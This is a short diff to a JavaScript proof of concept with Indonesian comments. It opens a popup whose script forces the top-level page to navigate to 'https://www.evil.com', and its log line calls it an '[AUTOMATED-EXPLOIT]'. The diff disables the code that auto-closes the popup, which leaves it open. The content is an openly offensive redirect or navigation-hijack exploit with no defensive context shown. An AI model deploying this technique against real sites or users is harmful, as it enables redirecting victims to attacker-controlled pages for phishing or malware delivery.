@@ -29,7 +29,7 @@
               try {
                 // Perintah ini akan berhasil karena dijalankan dari dalam popup.
                 window.top.location.href = "https://www.evil.com";
-              } catch (e) {
+              } catch (e ) {
                 // Pengaman jika terjadi kesalahan
                 document.body.innerHTML = "Failed: " + e.message;
               }
@@ -42,11 +42,10 @@
     // Menutup dokumen agar 'onload' bisa berjalan.
     newWin.document.close();
     
-    // Kita bisa langsung menutup popup setelah beberapa saat,
-    // karena tugasnya sudah selesai (mengirim perintah navigasi).
-    setTimeout(() => {
-      newWin.close();
-    }, 500);
+    // FUNGSI PENUTUPAN OTOMATIS TELAH DIHAPUS DARI BAGIAN INI.
+    // setTimeout(() => {
+    //   newWin.close();
+    // }, 500);
 
     console.log("[AUTOMATED-EXPLOIT] Popup opened and navigation command sent. The main tab should now be navigating.");
 
